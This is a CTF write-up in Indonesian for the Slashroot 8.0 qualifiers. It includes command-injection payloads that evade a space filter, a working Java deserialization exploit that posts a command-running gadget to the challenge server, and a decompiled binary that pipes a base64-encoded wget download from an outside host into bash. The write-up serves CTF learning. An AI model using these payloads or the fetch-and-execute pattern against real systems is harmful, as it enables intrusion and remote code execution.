---
description: >-
  Slashroot is a CTF event hosted by the ITB Stikom Bali. For the quals, the
  format of CTF is jeopardy-style and held online.
icon: slash-forward
cover: >-
  https://images.unsplash.com/photo-1613677135043-a2512fbf49fa?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwzfHxoYWNrfGVufDB8fHx8MTc0MDg3NTc3MXww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# Slashroot 8.0 2024

## 1. Login Begin (Web - Easy)

### 1.1. Description

> Hallo Peserta Slashroot CTF #8, Pada Hari Ini Kita Akan Mengikuti Penyisihan CTF, Sebelum Memulai Kegiatan, Saya Sebagai Probset Ingin Menguji Kemampuan Temen" Dalam Bidang Web Hacking, Ayo Teman" Cobalah Exploit Web Sederhana Buatan Saya Dan Temukan Hak Akses Admin Dalam Sebuah Web Tersebut !, Siapa Tau Diantara Teman" Dapat Menemukan Flag Tersembunyi Di Dalam Web Tersebut.
>
> http://ctf.slashrootctf.id:30011

### 1.2. Solve Walkthrough

* Challengenya berupa black box testing, sehingga tidak diberikan source code-nya.
* Di halaman register `/register.php` ada select **role**, tanpa pikir panjang, saya langsung intercept menggunakan burp suite ketika coba register.
* Waktu register, saya ganti rolenya menjadi **admin**.

<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

* Alhamdulillah, flag berhasil didapatkan.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 1.3. Flag

<kbd>slashroot8{W0w\_Y0u\_G00d\_B3gg1nn3r}</kbd>

## 2. Go-Ping (Web - Easy)

### 2.1. Description

> Let's try ping on my web
>
> Semakin kamu merasa nyaman, sistem semakin tidak aman
>
> http://ctf.slashrootctf.id:30012/

### 2.2. Solve Walkthrough

* Diberikan challenge black box testing lagi, setelah quick analysis, jelas itu vuln **Command Injection**.
* Tapi setelah saya coba masukan payload: `127.0.0.1;ls` tidak muncul list file apa-apa.
* Tidak berhenti di situ, saya coba tambahkan opsi `-lah` ternyata terpotong **`-lah` not found**. Saya juga udah coba ganti spasi dengan `${IFS}` tetap not found.
* Saya coba `ls /`, tapi muncul **permission denied**.
* Saya coba cara lain yaitu menggunakan commaand `find` seperti berikut:

<pre class="language-bash!"><code class="lang-bash!"><strong>find${IFS}/${IFS}-name${IFS}'flag*'${IFS}-type${IFS}f
</strong></code></pre>

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Nama file flagnya adalah `/flag_Zr8ovfVgFXqQdlbI.txt`.
* Dari sini, bisa kita ambil kesimpulan jika terdapat filter pada inputannya, yaitu **spasi akan dihilangkan (bisa kita akali dengan `${IFS}`)** dan **terdapat beberapa command yang prohibited untuk dieksekusi, seperti `ls`, `cat`, dan `more`**.
* Dan berikut adalah payload untuk bisa membaca flagnya, bisa menggunakan `tac`, `nl`, dan `less`, dll.

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 2.3. Flag

<kbd>slashroot8{Rc3\_W1Th\_c0mM4Nd\_1Nj3cT1On\_1S\_V3Ry\_v3rY\_N1Ce}</kbd>

## 3. EZZ Momento (Web - Medium)

### 3.1. Description

> java is ezz... zzz...
>
> but wait! whattt.......!?
>
> http://ctf.slashrootctf.id:30013 Diberikan source code: [dist.zip](https://ctf.slashrootctf.id/files/fdeb42f3b7de5cf8403484c1f3f44897/dist.zip?token=eyJ1c2VyX2lkIjoxNiwidGVhbV9pZCI6MzIsImZpbGVfaWQiOjE4fQ.ZvgxlQ.XJEWvmTXp41Ji30feQJFC-cYZHE)

### 3.2. Solve Walkthrough

* Kali tidak black box testing, tapi lumayan sulit bagi yang belum pernah belajar Java.
* Jujur aja saya banyak dibantu oleh AI. Kerentanan utamanya ada pada penggunaan `ObjectInputStream` dalam class `MyHandler`.

{% code lineNumbers="true" %}
```java
try (ObjectInputStream objectInputStream = new ObjectInputStream(exchange.getRequestBody())) {
    String response = "";
    try {
        response = objectInputStream.readObject().toString();
    } catch (ClassNotFoundException | IOException e) {
        e.printStackTrace();
        response = e.toString();
    }
    // ...
}
```
{% endcode %}

* Hal tersebut bisa menyebabkan RCE karena server langsung menerima objek yang diserialkan tanpa memvalidasinya terlebih dulu.
* Ditambah lagi ada class `Gadget` dan `Command` yang dapat membuat proses eksploitasi lebih mudah. Di mana class `Command` memungkinkan eksekusi perintah sistem secara langsung. Dan class `Gadget` akan memanggil method `run()` dari `Command` saat \`toString()\`\` dipanggil.
* Kemudian saya diberikan script `Exploit.java` menggunakan **Reflection** oleh AI untuk mencoba RCE. Setelah beberapa kali penyesuaian karena issue package-package di Java akhirnya bisa juga :)
* Berikut ini adalah exploit scriptnya:

{% code lineNumbers="true" %}
```java
// Script ini terletak di `src/main/java`

import com.dimas.Command;
import com.dimas.Gadget;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class Exploit {
    public static void main(String[] args) throws Exception {
        // Buat objek Command menggunakan konstruktor tanpa argumen
        Command cmd = new Command();
        
        // Gunakan refleksi untuk mengakses dan mengubah field 'command'
        Field commandField = Command.class.getDeclaredField("command");
        commandField.setAccessible(true);
        commandField.set(cmd, "cat /flag.txt");
        
        // Bungkus Command dalam Gadget
        Gadget gadget = new Gadget(cmd);
        
        // Serialisasi objek Gadget
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(gadget);
        oos.close();
        
        // Encode payload ke Base64
        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
        
        // Kirim payload ke server
        URL url = new URL("http://ctf.slashrootctf.id:30013");
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.getOutputStream().write(Base64.getDecoder().decode(payload));
        
        // Baca respons dari server
        java.util.Scanner s = new java.util.Scanner(con.getInputStream()).useDelimiter("\\A");
        String response = s.hasNext() ? s.next() : "";
        System.out.println("Server response: " + response);
    }
}
```
{% endcode %}

* Alhamdulillah, berhasil solve semua soal web exploit :))

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 3.3. Flag

<kbd>slashroot8{it\_is\_really\_private\_UwU}</kbd>

## 4. Package Delivery (Joy - Easy)

### 4.1. Description

> A game about a mundane task...
>
> Some say if you deliver an exact number of packages, a magic text will appear??
>
> Diberikan source code apk: [PackageDelivery.zip](https://ctf.slashrootctf.id/files/f57dd9357ae8166409d2443ebd59a4a0/PackageDelivery.zip?token=eyJ1c2VyX2lkIjoxNiwidGVhbV9pZCI6MzIsImZpbGVfaWQiOjEyfQ.Zvgzcg.sBBnzp0VLjyjDhwBT-NuRE4Ab58)

### 4.2. Solve Walkthrough

* Challenge ini sangat mudah dari yang saya bayangkan, hanya modal `strings` langsung solve.
* Awalnya saya coba mainkan gamenya dulu siapa tau ada anomali kan wkwk.
* Ternyata di harus sampe score 9999 baru ada gift spesial (mungkin aja flag).
* Ngapain harus se-effort itu kan, lalu saya coba quick analysis file `.pck` untuk nemuin something interest.
* Alhamdulillah, ketika saya coba cari **"slashroot"** langsung ketemu flagnya. Agak curiga sih di awal kenapa semudah itu, tapi gas ajalah wkwk.

<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 4.3. Flag

<kbd>slashroot8{N0T90Nn4l1e\_tH4T\_w45\_E45y\_hUh?}</kbd>

## 5. baby-lua (RE - Easy)

### 5.1. Description

> lua but baby
>
> Diberikan sebuah ELF file: [main](https://ctf.slashrootctf.id/files/4770ab6c4f75fa4142e05a0fae60fed8/main?token=eyJ1c2VyX2lkIjoxNiwidGVhbV9pZCI6MzIsImZpbGVfaWQiOjIwfQ.Zvg07w.10ejWUi6oVFoMxYAajY2YXtVxxk)

### 5.2. Solve Walkthrough

* Disclaimer dulu, saya gak jago Reverse ya ges, iseng-iseng aja ini.
* Setelah saya coba decompile menggunakan Ghidra, ada something interesting di fungsi `init()`, di mana mengeksekusi command seperti berikut.

{% code title="chall.c" lineNumbers="true" %}
```c
int init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  char local_408 [1024];
  
  sprintf(local_408,
          "echo d2dldCAtcSAtTyAvdG1wL3V3dSBodHRwczovL2FpbWFyLmlkL2ZsYWcubHVhYw== | base64 -d | bash"
         );
  iVar1 = system(local_408);
  return iVar1;
}
```
{% endcode %}

* Ketika saya coba execute command tersebut di local machine, ada file `uwu` di direktori `/tmp`. Saya coba cek file apakah itu, ternyata merupakan file bytecode dalam bahasa Lua.
* Langsung saja saya decompile bytecode itu dan ini hasilnya.

<pre class="language-lua" data-title="bytecode.lua" data-line-numbers><code class="lang-lua"><strong>    -- filename: 
</strong>    -- version: lua52
    -- line: [0, 0] id: 0
    check_flag = function(r0_1)
    -- line: [1, 45] id: 1
    local r1_1 = {
        0,
        1,
        1,
        1,
        0,
       ... omitted ...,
        0,
        1,
        1,
        1,
        1,
        1,
        0,
        1
    }
    local r2_1 = ""
    for r6_1 = 1, #r0_1, 1 do
        local r8_1 = string.byte(r0_1:sub(r6_1, r6_1))
        for r12_1 = 7, 0, -1 do
        if 2 ^ r12_1 &#x3C;= r8_1 then
            r2_1 = r2_1 .. "1"
            r8_1 = r8_1 - 2 ^ r12_1
        else
            r2_1 = r2_1 .. "0"
        end
        end
    end
    if #r2_1 ~= #r1_1 then
        return false
    end
    local r3_1 = 0
    for r7_1 = 1, #r1_1, 1 do
        if tonumber(r2_1:sub(r7_1, r7_1)) == r1_1[r7_1] then
        r3_1 = r3_1 + 1
        end
    end
    local r4_1 = r2_1 == table.concat(r1_1)
    end
</code></pre>

* Kode Lua di atas tampaknya melakukan pengecekan flag dengan mengubah input menjadi representasi biner dan membandingkannya dengan array biner yang telah ditentukan.
* Langsung saja saya buat solver scriptnya menggunakan Python3.

{% code title="solver.py" lineNumbers="true" %}
```python
# Function to decode flag from binary array
def decode_flag(binary_array):
    # Convert binary array to string
    binary_string = ''.join(map(str, binary_array))
    
    # Split binary string into 8-bit chunks
    chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    
    # Convert each chunk to character
    flag = ''.join([chr(int(chunk, 2)) for chunk in chunks])
    
    return flag

# Binary array from the Lua code
binary_array = [
    0,1,1,1,0,0,1,1,0,1,1,0,1,1,0,0,0,1,1,0,0,0,0,1,0,1,1,1,0,0,1,1,
    0,1,1,0,1,0,0,0,0,1,1,1,0,0,1,0,0,1,1,0,1,1,1,1,0,1,1,0,1,1,1,1,
    0,1,1,1,0,1,0,0,0,0,1,1,1,0,0,0,0,1,1,1,1,0,1,1,0,1,1,0,0,1,0,1,
    0,1,1,1,1,0,1,0,0,1,0,1,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,0,1,1,1,0,
    0,0,1,1,0,0,1,1,0,1,0,1,1,1,1,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,0,
    0,1,1,1,0,0,1,0,0,1,0,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,0,0,0,
    0,1,1,1,0,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,0,0,1,1,0,1,1,0,0,1,0,1,
    0,1,1,0,0,1,0,1,0,1,0,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,0,0,0,
    0,1,1,1,0,1,0,1,0,1,0,1,1,1,1,1,0,0,1,1,0,0,0,1,0,1,1,0,1,1,1,0,
    0,1,0,1,1,1,1,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,1,0,1,1,0,1,1,1,0,
    0,0,1,1,0,1,0,0,0,1,1,0,1,1,0,0,0,1,1,1,1,1,0,1
]

flag = decode_flag(binary_array)
print("Flag:", flag)
```
{% endcode %}

### 5.3. Flag

<kbd>slashroot8{ez\_0n3\_f0r\_y0u\_see\_y0u\_1n\_f1n4l}</kbd>

## 6. Find The Key (Foren - Easy)

### 6.1. Description

> Temukan key = solve
>
> Diberikan sebuah file: [ssstttttt.unknown](https://ctf.slashrootctf.id/files/9e330d8aad63dd0b39c8a3690af28f95/ssstttttt.unknown?token=eyJ1c2VyX2lkIjoxNiwidGVhbV9pZCI6MzIsImZpbGVfaWQiOjd9.Zvg4Gg.zZyfjkmJlYBu4hk1FCIqjjDE8gc)

### 6.2. Solve Walkthrough

* Saya coba liat file signature dari file tersebut, sepertinya terpotong. Bisa dilihat pada gambar di bawah, 3 digit hex yang di-highlight sepertinya indikasi file JPG.

<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Setelah saya coba fix dengan file signature yang sesuai, tidak ada flag yang muncul.

<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Analisis selanjutnya yaitu mengecek bagian human readable dari file tersebut dengan `strings`.

<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

* Nampak sebuah flag tapi formatnya salah, terbukti ketika dicoba submit, baik dengan kelebihan **r** atau pun tidak hasilnya tetap incorrect.
* Saya coba decode nilai hex di bawahnya, flagnya masih incorrect.

<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

* Kemudian, saya coba kode binary yang di bawahnya, berikut hasil konversi ke ascii (text).

<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

* Hmm, sebuah flag juga, tapi ketika coba submit masih incorrect.
* Saya coba decode nilai hex yang di atas flag awal, hasilnya adalah `admin123`.

<figure><img src=".gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

* Sejenak saya berpikir mungkin saja itu sebuah password, but for what ?? Apakah ini sebuah file archive yang diproteksi password ?
* Saya coba cari nilai hex yang relevan dengan file signature zip yaitu `50 4B 03 04`, ternyata ada dong dan itu **berulang sebanyak 4 kali**.

<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* Ketika file signaturenya diganti dari jpg ke zip beneran bisa dong.

<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

* Saya coba baca isi file tersebut, rata-rata semuanya di-encode menggunakan base64 dan ternyata di dalamnya ada banyak sekali flag palsu. Sampai pada akhirnya, alhamdulillah saya berhasil ketemu flag aslinya sebelum nilai binary.

<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* Bang jangan di prank mulu donk, udah salah berape kali gw :v.

### 6.3. Flag

<kbd>slashroot8{Y4n9\_b1k1n\_s04l\_m4s1h\_p3mul4}</kbd>

***

**Tags**: #ctf, #web-exploitation, #forensic, #rev, #joy
